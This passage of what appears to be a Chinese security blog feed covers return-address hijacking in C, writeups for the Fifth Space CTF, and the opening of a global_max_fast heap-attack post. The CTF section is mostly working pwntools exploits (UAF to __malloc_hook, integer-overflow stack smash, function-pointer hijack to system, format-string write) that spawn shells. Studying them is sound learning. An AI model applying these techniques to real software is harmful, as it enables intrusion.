class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0x08048445 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xf7f90dbc (environ) —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— <span class="string">'XDG_VTNR=7'</span></span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcc80 ◂— 0x1</span><br><span class="line"> EDX  0xffffcca4 ◂— 0x0</span><br><span class="line"> EDI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcc68 ◂— 0x0</span><br><span class="line"> ESP  0xffffcc44 ◂— 0x1</span><br><span class="line"> EIP  0x8048445 (main+30) —▸ 0xffffc1e8 ◂— 0x0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048435 &lt;main+14&gt;    sub    esp, 0x14</span><br><span class="line">   0x8048438 &lt;main+17&gt;    mov    dword ptr [ebp - 0xc], 0</span><br><span class="line">   0x804843f &lt;main+24&gt;    push   3</span><br><span class="line">   0x8048441 &lt;main+26&gt;    push   2</span><br><span class="line">   0x8048443 &lt;main+28&gt;    push   1</span><br><span class="line"> ► 0x8048445 &lt;main+30&gt;    call   <span class="keyword">function</span> &lt;0x804840b&gt;</span><br><span class="line">        arg0: 0x1</span><br><span class="line"> </span><br><span class="line">   0x804844a &lt;main+35&gt;    add    esp, 0xc</span><br><span class="line">   0x804844d &lt;main+38&gt;    mov    dword ptr [ebp - 0xc], 1</span><br><span class="line">   0x8048454 &lt;main+45&gt;    sub    esp, 8</span><br><span class="line">   0x8048457 &lt;main+48&gt;    push   dword ptr [ebp - 0xc]</span><br><span class="line">   0x804845a &lt;main+51&gt;    push   0x80484f0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcc44 ◂— 0x1</span><br><span class="line">01:0004│      0xffffcc48 ◂— 0x2</span><br><span class="line">02:0008│      0xffffcc4c ◂— 0x3</span><br><span class="line">03:000c│      0xffffcc50 ◂— 0x1</span><br><span class="line">04:0010│      0xffffcc54 —▸ 0xffffcd14 —▸ 0xffffcf13 ◂— 0x6d6f682f (<span class="string">'/hom'</span>)</span><br><span class="line">05:0014│      0xffffcc58 —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— <span class="string">'XDG_VTNR=7'</span></span><br><span class="line">06:0018│      0xffffcc5c ◂— 0x0</span><br><span class="line">07:001c│      0xffffcc60 —▸ 0xf7f8f3dc (__exit_funcs) —▸ 0xf7f901e0 (initial) ◂— 0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  8048445 main+30</span><br><span class="line">   f 1 f7df5637 __libc_start_main+247</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">x is 0</span><br><span class="line">[Inferior 1 (process 10680) exited with code 07]</span><br></pre></td></tr></table></figure></p><p>纳尼，程序执行完function函数之后，就输出x的值了，并退出了。<br>看来我之前的思路完全错了，我还以为那个函数把1修改为0了，看来是劫持了程序的执行流，跳过了x=1;这个语句</p><p>接下里就分析一下那个函数是如何劫持程序执行流的,进入function函数进行调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0x08048422 in function ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffcc40 —▸ 0x804844a (main+35) ◂— add    esp, 0xc</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcc80 ◂— 0x1</span><br><span class="line"> EDX  0x8048452 (main+43) ◂— add    byte ptr [eax], al</span><br><span class="line"> EDI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcc3c —▸ 0xffffcc68 ◂— 0x0</span><br><span class="line"> ESP  0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg     0xf7ddd047</span><br><span class="line"> EIP  0x8048422 (function+23) ◂— mov    dword ptr [eax], edx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048414 &lt;function+9&gt;     mov    dword ptr [ebp - 4], eax</span><br><span class="line">   0x8048417 &lt;function+12&gt;    mov    eax, dword ptr [ebp - 4]</span><br><span class="line">   0x804841a &lt;function+15&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">   0x804841c &lt;function+17&gt;    lea    edx, [eax + 8]</span><br><span class="line">   0x804841f &lt;function+20&gt;    mov    eax, dword ptr [ebp - 4]</span><br><span class="line"> ► 0x8048422 &lt;function+23&gt;    mov    dword ptr [eax], edx &lt;0x8048452&gt;  ##这里是关键</span><br><span class="line">   0x8048424 &lt;function+25&gt;    nop    </span><br><span class="line">   0x8048425 &lt;function+26&gt;    leave  </span><br><span class="line">   0x8048426 &lt;function+27&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048452 &lt;main+43&gt;        add    byte ptr [eax], al</span><br><span class="line">   0x8048454 &lt;main+45&gt;        sub    esp, 8</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg     0xf7ddd047</span><br><span class="line">01:0004│      0xffffcc30 ◂— 0x8000</span><br><span class="line">02:0008│      0xffffcc34 —▸ 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">03:000c│      0xffffcc38 —▸ 0xffffcc40 —▸ 0x804844a (main+35) ◂— add    esp, 0xc</span><br><span class="line">04:0010│ ebp  0xffffcc3c —▸ 0xffffcc68 ◂— 0x0</span><br><span class="line">05:0014│ eax  0xffffcc40 —▸ 0x804844a (main+35) ◂— add    esp, 0xc</span><br><span class="line">06:0018│      0xffffcc44 ◂— 0x1</span><br><span class="line">07:001c│      0xffffcc48 ◂— 0x2</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  8048422 function+23</span><br><span class="line">   f 1  804844a main+35</span><br><span class="line">   f 2 f7df5637 __libc_start_main+247</span><br></pre></td></tr></table></figure></p><p>可以看到下面这句汇编把eax寄存器指向的地址0x804844a (main+35)修改为了0x8048452<br>0x8048422 &lt;function+23&gt;    mov    dword ptr [eax], edx <0x8048452></0x8048452></p><p>我们配合着mian函数的汇编来看一下，0x8048844a这个地址是调用完function函数的下一个地址，也就相当于function的函数返回地址;<br>但是这里被修改成了0x8048452，那这样就造成了执行完function函数之后，就跳转到0x8048452这个地址继续执行;<br>从而跳过了0x0804844d &lt;+38&gt;:    mov    DWORD PTR [ebp-0xc],0x1 这个赋值语句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048427 &lt;+0&gt;:lea    ecx,[esp+0x4]</span><br><span class="line">   0x0804842b &lt;+4&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x0804842e &lt;+7&gt;:push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048431 &lt;+10&gt;:push   ebp</span><br><span class="line">   0x08048432 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">   0x08048434 &lt;+13&gt;:push   ecx</span><br><span class="line">   0x08048435 &lt;+14&gt;:sub    esp,0x14</span><br><span class="line">   0x08048438 &lt;+17&gt;:mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x0804843f &lt;+24&gt;:push   0x3</span><br><span class="line">   0x08048441 &lt;+26&gt;:push   0x2</span><br><span class="line">   0x08048443 &lt;+28&gt;:push   0x1</span><br><span class="line">   0x08048445 &lt;+30&gt;:call   0x804840b &lt;<span class="keyword">function</span>&gt;</span><br><span class="line">   0x0804844a &lt;+35&gt;:add    esp,0xc</span><br><span class="line">   0x0804844d &lt;+38&gt;:mov    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">   0x08048454 &lt;+45&gt;:sub    esp,0x8</span><br><span class="line">   0x08048457 &lt;+48&gt;:push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804845a &lt;+51&gt;:push   0x80484f0</span><br><span class="line">   0x0804845f &lt;+56&gt;:call   0x80482e0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048464 &lt;+61&gt;:add    esp,0x10</span><br><span class="line">   0x08048467 &lt;+64&gt;:nop</span><br><span class="line">   0x08048468 &lt;+65&gt;:mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x0804846b &lt;+68&gt;:leave  </span><br><span class="line">   0x0804846c &lt;+69&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">   0x0804846f &lt;+72&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>现在就很明显了，0x8048452-0x8048844a=8;</p><p>从c语言的角度来看ret=&amp;a-1;这句话就是取栈中 函数第一个参数 上面的函数返回地址的 <strong>地址指针</strong>；<br>注意运算符优先级，先算术运算，后移位运算，最后位运算；ret=&amp;(a-1)<br>然后(*ret)+=8，函数返回地址再加8，劫持了程序执行流。<br>这个程序加8不是很好，应该改为加10更为严谨；</p><p>而64位程序是通过寄存器来传参的，ret取到的不是函数返回地址，就没办法劫持程序执行流了</p><p>64位的程序就不在演示调试了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天看到一段有趣的c代码，如下:&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/s
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>第五空间线下pwn部分writeup</title>
    <link href="https://nocbtm.github.io/2019/10/05/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Bpwn%E9%83%A8%E5%88%86writeup/"/>
    <id>https://nocbtm.github.io/2019/10/05/第五空间线下pwn部分writeup/</id>
    <published>2019-10-05T09:59:36.000Z</published>
    <updated>2019-10-08T10:24:56.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="壹業"><a href="#壹業" class="headerlink" title="壹業"></a>壹業</h2><p>标准的UAF漏洞题</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>创建unsortedbin的chunk,free掉，然后再show，就能泄露libc地址</li><li>复写malloc_hook为one_gadget</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>本地环境：ubuntu 16.04<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="comment">#r=remote('0.0.0.0',10000)</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x7f7436b23b78</span><span class="number">-0x7f743675f000</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_off)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,cont)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak- libc_off</span><br><span class="line">mallochook=libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">one=libc.address+onegadgets[<span class="number">3</span>]</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(mallochook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="三學"><a href="#三學" class="headerlink" title="三學"></a>三學</h2><p>整数溢出造成栈溢出</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r=process(<span class="string">'./pwn3'</span>)</span><br><span class="line"><span class="comment">#r=remote("0.0.0.0",10001)</span></span><br><span class="line">sys=<span class="number">0x8048440</span></span><br><span class="line">sh=<span class="number">0x804a04c</span></span><br><span class="line">r.recvuntil(<span class="string">':'</span>) <span class="comment">#name</span></span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>) <span class="comment">#chose</span></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>) <span class="comment">#size</span></span><br><span class="line">r.sendline(<span class="string">'-1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>) <span class="comment">#content</span></span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">0x5C</span>+p32(<span class="number">0xffffffff</span>)+p32(sys)+p32(<span class="number">0</span>)+p32(sh))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="四諦"><a href="#四諦" class="headerlink" title="四諦"></a>四諦</h2><p>堆中存在调用puts函数的函数指针,而且还通过堆块来调用函数</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r= process(<span class="string">'./pwn4'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">got_puts=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">'got_puts-&gt;'</span>+hex(got_puts))</span><br><span class="line">pause()</span><br><span class="line">func=<span class="number">0x80491f2</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"0"</span>*<span class="number">4</span>)<span class="comment">#0</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"1"</span>*<span class="number">4</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(func)+p32(got_puts))<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">puts=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">success(hex(puts))</span><br><span class="line">pause()</span><br><span class="line">libc.address=puts-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys=libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(sys)+<span class="string">';$0\x00'</span>)<span class="comment">#3</span></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="五蘊"><a href="#五蘊" class="headerlink" title="五蘊"></a>五蘊</h2><p>格式化字符串漏洞，直接向unk_804c044写特定数，再输入相同的数，可用三种不同方法得到shell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r=process(<span class="string">'./pwn5'</span>)</span><br><span class="line"><span class="comment">#r=remote('0.0.0.0',10003)</span></span><br><span class="line">target=<span class="number">0x804c044</span></span><br><span class="line"><span class="comment">#pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+'%10$hhn%11$hhn%12$hhn%13$hhn'</span></span><br><span class="line"><span class="comment">#r.sendline(str(0x10101010))</span></span><br><span class="line">pay=p32(target)+<span class="string">'%012s'</span>+<span class="string">'%10$n'</span></span><br><span class="line">pay=p32(target)+<span class="string">'a'</span>*<span class="number">12</span>+<span class="string">'%10$n'</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;壹業&quot;&gt;&lt;a href=&quot;#壹業&quot; class=&quot;headerlink&quot; title=&quot;壹業&quot;&gt;&lt;/a&gt;壹業&lt;/h2&gt;&lt;p&gt;标准的UAF漏洞题&lt;/p&gt;
&lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>global_max_fast相关利用</title>
    <link href="https://nocbtm.github.io/2019/10/04/global-max-fast%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2019/10/04/global-max-fast相关利用/</id>
    <published>2019-10-04T05:23:04.000Z</published>
    <updated>2019-10-04T10:57:14.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="global-max-fas"><a href="#global-max-fas" class="headerlink" title="global_max_fas"></a>global_max_fas</h2><p>global_max_fast这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。在glibc-2.23中看下它的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \</span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)                           \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure></p><p>set_max_fast初始化函数开始是在malloc_init_state调用的，可以看到这个宏定义的作用是设置global_max_fast默认值，默认值是0x80。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改写global_max_fast为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的任意地址写入堆块的地址。</p><p>即利用global_max_fast进行相关的攻击</p><h2 